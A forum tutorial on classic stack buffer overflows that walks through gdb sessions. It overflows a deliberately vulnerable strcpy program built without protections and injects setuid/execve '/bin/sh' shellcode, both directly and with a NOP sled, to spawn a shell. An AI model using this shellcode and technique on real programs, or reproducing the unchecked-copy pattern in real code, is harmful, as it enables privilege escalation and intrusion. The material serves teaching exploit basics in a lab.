    Understanding stack overflows!!!!

    Prerequisites: Knowing the working of the stack..If you want , you can read my previous article on 'Understanding stack'

    Alright, i told fb1h2s that i would make an article on stack overflows after i fully understood it.. Well i was confused like crazy for about 2 days... Finally understood it..Hope i can save someone from the frustration i went through ... tats the reason for creating this article in the first place...

    And...Here we go...

    A little bit more on stack :

    Take this code:
    Code:
    #include<stdio.h>
main(int argc, char **argv)
{
char buffer[12];
strcpy(buffer,argv[1]);
}
    after the control has come to the main function, (remember libc_start_main calls main() and after execution main() returns to it), the stack will look like this

    Code:
    Higher addr                                                       lower address
[ret] [ebp-libc_start_main] [buffer] [addr of argv[1]]  [addr buf]
    everything is 4 bytes except buffer which is 12 bytes. the address of argv[1] and the address of buffer are pushed for the strcpy().



    Smashing the stack -- The hard way

    Take this program where the buffer size is large...

    Code:
    #include<stdio.h>
main(int argc,char **argv)
{
char buffer[100];
strcpy(buffer,argv[1]);
}
    the stack arrangement is the same as above except tat buffer size is now 100 bytes. strcpy() doesnt check the bounds when it copies therefore it is possible to write into adjacent memory locations namely the ebp-main and the saved ret address.

    compile it..
    Code:
    $ gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o test test.c -g
    run it
    Code:
    $./test
$
    fire up gdb and lets see wat happens
    Code:
    $gdb ./test -q
(gdb)list
1       #include<stdio.h>
2       #include<string.h>
3       int main(int argc,char **argv)
4       {
5       char buffer[100];
6       strcpy(buffer,argv[1]);
7        }
(gdb) break 6
set the breakpoint before the strcpy()
In an ideal case it will take 108 bytes to overflow eip completely, but the compiler may add padding bytes in between , so it wont be 108 in all machine..depends heavily on the compiler in use. So guessing the offset can be done by bruteforcing or trying to figure out from the disassembled code. In mine, it takes 120 bytes to overflow eip completely
(gdb)run $(perl -e 'print "A" x 120')
it will hit the breakpoint
lets examine how the  stack looks like
(gdb)x/120xb $esp
b--> byte
0xbffff750:     0x00    0x00    0x00    0x00    0x00    0xf8    0xff    0xbf
0xbffff758:     0xe0    0x16    0x00    0xb8    0x24    0x82    0x04    0x08
0xbffff760:     0x00    0x00    0x00    0x01    0x2e    0x4e    0x3d    0xf6
0xbffff768:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
*trimmed*
0xbffff7c0:     0xe0    0x0c    0x00    0xb8    0x40    0x84    0x04    0x08
The output has been trimmed for brevity....
The last 4 bytes is the return address...we can verify it by disassembling the instruction at tat address
(gdb)disas 0x08048440
and we can find that it is from in libc_start_main()
lets step
(gdb)s
(gdb)x/120xb $esp
0xbffff750:     0x58    0xf7    0xff    0xbf    0xa0    0xf9    0xff    0xbf
0xbffff758:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
*trimmed*
0xbffff7c0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    Well our eip has been overwritten with 0x41 which is 'A' in hex.
    stepping further will result in segmentation fault since 0x41414141 is an address the program cant access ie it is outside its memory boundary. If eip contains an address where our code is situated then tat code will be execute. 'This' code is also called the 'shellcode' coz the main objective is to get a shell. We will cover writing shellcode in some other article..for now lets just exploit it using a ripped shellcode..

    Important things to notice from the debugging above:-
    the esp points to 0xbffff750 and the buffer points to 0xbffff750 + 8 = 0xbffff758

    This is how our exploit buffer must be arranged ... Using this method avoids the use of NOPs we will cover NOPs later in this article.
    We are using a 32 byte shellcode
    Our payload should be like this:
    [shellcode(32 bytes)][repeated return address(88 bytes)]
    If we give like this then, the saved return address will get overwritten with the address of our buffer which contains the shellcode and when strcpy() returns our shellcode will be executed.

    The shellcode is
    \x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x 6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
    \xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80

    Code:
    (gdb) run $(perl -e 'print "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80", "\x58\xf7\xff\xbf"x25')
after stepping through the breakpoint
(gdb)s
(gdb)x/120xb $esp
notice that the return address has been modified to point to the start of the shellcode(buffer) 0xbffff758
On further stepping we get the shell
sh-3.2$
    W00t!!!
    Alright now for the use of NOPs
    NOP s are basically one byte opcodes / machine instructions which doesnt do anything. They are mainly used for timing purposes and memory alignment.
    Now assume our exploit payload is like this
    [60 bytes nops][shellcode(32 b)][repeated return address(rest)]
    Now if our repeated return address is anywhere between the start of the buffer and the end of the nopsled, our shellcode is guaranteed to be executed, makes life easier
    \x90 --> nop
    lets try it..am skipping some steps which are repeated above
    Code:
    (gdb) run $(perl -e 'print "\x90"x60,"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53
\x89\xe1\x8d\x42\x0b\xcd\x80","\x68\xf7\xff\xbf"x10')

Here the repeated return address is given as 0xbffff768 which lies in the nop sled hence we get the shell....
(gdb)s
sh-3.2$
